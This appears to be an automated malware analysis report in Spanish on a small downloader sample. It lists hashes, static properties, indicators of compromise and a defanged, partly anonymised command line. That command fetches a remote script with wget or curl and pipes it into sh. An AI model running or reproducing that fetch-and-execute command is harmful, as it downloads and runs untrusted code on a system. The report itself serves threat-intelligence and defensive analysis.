# 🧬 Payload Analysis

`571d1d0610bd36d0b91029a9d865c85b76453a91712cd362dfdf09e236d76f11`

## 📌 Resumen

Texto ASCII de 372 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://217.60.195.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh`
2. `curl -sk hxxps://217.60.195.XXX/sh)`
3. `sh -s apache.selfre` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/571d1d0610bd36d0b91029a9d865c85b76453a91712cd362dfdf09e236d76f11.md](../../../../../malware-like/oraculo/downloader/571d1d0610bd36d0b91029a9d865c85b76453a91712cd362dfdf09e236d76f11.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:31:49.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `571d1d0610bd36d0b91029a9d865c85b76453a91712cd362dfdf09e236d76f11`
- **MD5:** `d0fd87e304de1721df24d9f9ac2e1b5c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 372 B |
| Entropía | 5.14 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)
Download indicators (wget/curl + /tmp)
Download indicators (wget/curl + /tmp)
Download indicators (wget/curl + /tmp)
Download indicators (wget/curl + /tmp)
Download indicators (wget/curl + /tmp)
- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| ip | 217.60.195.XXX | static_analysis |
| ip | 190.179.164.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | 571d1d0610bd36d0b91029a9d865c85b76453a91712cd362dfdf09e236d76f11 | static_analysis |
| ip | 89.126.211.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
